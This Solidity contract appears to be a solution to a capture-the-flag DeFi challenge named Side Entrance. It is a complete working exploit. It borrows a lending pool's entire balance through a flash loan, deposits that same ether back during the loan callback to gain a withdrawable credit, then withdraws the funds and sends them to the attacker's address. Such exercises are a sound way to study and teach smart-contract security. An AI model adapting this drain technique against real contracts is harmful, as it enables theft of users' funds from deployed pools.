// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
  function deposit() external payable;
  function withdraw() external;
  function flashLoan(uint256 amount) external;
}

contract AttackSideEntrance {
  ISideEntranceLenderPool internal pool;

  constructor(address _pool) {
    pool = ISideEntranceLenderPool(_pool);
  }

  function attack() external {
    uint256 bal = address(pool).balance;
    pool.flashLoan(bal); 
    pool.withdraw(); // withdraw funds to this contract
    (bool success,) = payable(msg.sender).call{value: address(this).balance}(""); // send funds to attacker address
    require(success);
  }

  // execute is called in pool.flashloan using interface
  function execute() external payable {
    pool.deposit{value: msg.value}();
  }

  receive() external payable {}
}